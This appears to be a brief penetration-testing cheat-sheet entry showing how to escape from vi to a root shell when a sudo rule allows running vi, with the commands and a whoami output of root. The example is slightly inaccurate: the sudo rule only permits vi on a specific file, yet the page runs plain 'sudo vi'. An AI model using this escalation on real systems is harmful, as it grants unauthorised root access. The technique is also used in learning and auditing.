# vi

`vi` can be use for privilege escalations

For example, if sudo -l of a non-root user returns the following :

```bash
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

We can launch vi as root :&#x20;

```bash
sudo vi
```

Then set a shell variable :&#x20;

```bash
:shell=/bin/sh
```

And call the shell :&#x20;

```bash
:shell
# whoami
whoami
root
```

\-> The shell is launched as root 🍾
